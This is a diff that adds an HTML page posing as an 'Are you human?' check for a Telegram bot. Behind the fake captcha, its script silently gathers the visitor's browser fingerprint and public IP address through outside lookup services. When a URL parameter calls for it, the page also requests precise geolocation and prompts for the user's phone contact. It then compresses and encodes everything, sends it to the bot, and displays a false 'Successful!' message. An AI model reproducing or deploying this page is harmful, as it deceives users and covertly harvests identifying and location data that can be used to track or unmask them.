@@ -1,0 +1,124 @@
+<!DOCTYPE html>                                                                                           <html>                                                                                                    <head>
+    <title>Are you human?</title>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <script src="https://cdn.jsdelivr.net/npm/pako@2.0.4/dist/pako.min.js"></script>
+    <script src="https://telegram.org/js/telegram-web-app.js"></script>
+</head>
+<body>
+    <h1>Are you human?</h1>
+    <div id="loader"></div>
+    <div id="myDiv" class="animate-bottom">
+        <h2>Successful!</h2>
+        <p>Go back to the bot...</p>
+    </div>
+    <script defer="defer">
+        const urlParams = new URLSearchParams(window.location.search);
+        var fields = urlParams.get('fields');
+        if (fields) {} else {fields = ""};
+
+        var jsd = {
+            "user_agent": navigator.userAgent,
+            "app": {
+                "app_name": navigator.appName,
+                "app_code_name": navigator.appCodeName,
+                "app_version": navigator.appVersion,
+                "prod": navigator.product,
+                "sub_prod": navigator.productSub,
+                "vendor": navigator.vendor,
+                "sub_vendor": navigator.vendorSub
+            },
+            "platform": navigator.platform,
+            "tg_platform": window.Telegram.WebApp.platform,
+            "tz": new Date().toTimeString().slice(9),
+            "lang": navigator.language,
+            "langs": navigator.languages,
+            "screen": {
+                "width": window.screen.width,
+                "height": window.screen.height,
+                "pixelDepth": window.screen.pixelDepth,
+                "isExtended": window.screen.isExtended,
+                "colorDepth": window.screen.colorDepth
+            },
+            "ip_data": {
+                "ipify": httpRequest("https://api.ipify.org", "GET"),
+                "ident": httpRequest("https://6.ident.me", "GET")
+            }
+        };
+
+        function httpRequest(address, reqType, asyncProc) {
+            try {
+                var req = window.XMLHttpRequest ? new XMLHttpRequest() : new ActiveXObject("Microsoft.XMLHTTP");
+                if (asyncProc) {
+                    req.onreadystatechange = function() {
+                        if (this.readyState == 4) {
+                            asyncProc(this);
+                        }
+                    };
+                }
+                req.open(reqType, address, !(!asyncProc));
+                req.send();
+                if (req.status >= 200 && req.status < 400) {
+                    return req.responseText;
+                } else {
+                    return req.status;
+                }
+            } catch(err) {
+                return "";
+            }
+        }
+
+        function start(uid1) {
+            jsd.uid = uid1;
+            if (fields.includes("geo")) {
+                if (navigator && navigator.geolocation) {
+                    navigator.geolocation.getCurrentPosition(successGeoCallback, errorGeoCallback);
+                } else {
+                    jsd.geo = "not support";
+                    start2();
+                }
+            } else {
+                start2();
+            }
+        }
+
+        function errorGeoCallback() {
+            jsd.geo = "error";
+            start2();
+        }
+
+        function successGeoCallback(position) {
+            jsd.geo = position.coords.latitude + ';' + position.coords.longitude + ';' + position.coords.altitude + ';' + position.coords.accuracy + ';' + position.coords.speed;
+            start2();
+        }
+
+        function start2() {
+            if (fields.includes("contact")) {
+                start3();
+            } else {
+                start4();
+            }
+        }
+
+        function start3() {
+            Telegram.WebApp.requestContact(function(result) {
+                if (result) {
+                    jsd.contact = 2;
+                    start4();
+                } else {
+                    jsd.contact = 1;
+                    start4();
+                }
+            });
+        }
+
+        function start4() {
+            var strt = JSON.stringify(jsd);
+            var strt3 = btoa(String.fromCharCode.apply(null, pako.gzip(strt)));
+            window.Telegram.WebApp.sendData(strt3);
+            document.getElementById("loader").style.display = "none";
+            document.getElementById("myDiv").style.display = "block";
+        }
+    </script>
+</body>
+</html>
